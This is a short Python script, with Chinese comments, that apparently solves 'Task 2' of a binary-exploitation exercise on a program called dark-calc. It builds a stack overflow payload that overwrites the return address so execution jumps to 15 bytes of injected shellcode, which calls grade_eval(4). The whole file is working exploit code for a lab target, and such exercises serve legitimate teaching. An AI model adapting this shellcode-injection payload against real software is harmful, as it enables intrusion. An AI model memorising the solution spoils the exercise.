#!/usr/bin/env python3
"""Task 2: 在 dark-calc 的固定栈上执行 shellcode，调用 grade_eval(4)。"""
import sys, struct

p64 = lambda x: struct.pack("<Q", x)
p32 = lambda x: struct.pack("<I", x)

# 15 字节 shellcode：调用 grade_eval(4)
shellcode  = b"\xbf\x04\x00\x00\x00"          # mov edi, 4
shellcode += b"\x48\x83\xec\x18"               # sub rsp, 0x18  （栈对齐）
shellcode += b"\x68" + p32(0x401a87)           # push grade_eval
shellcode += b"\xc3"                           # ret

payload  = b"A" * 8                        # 0x721000800fd0（会被 push 覆盖，无所谓）
payload += p64(0x4141414141414141)         # 0x721000800fd8：grade_eval 返回后落点 → 段错误
payload += b"B" * 8                        # 0x721000800fe0：saved rbp
payload += p64(0x721000800ff0)             # 0x721000800fe8：返回地址 → shellcode
payload += shellcode                       # 0x721000800ff0：15 字节

sys.stdout.buffer.write(payload)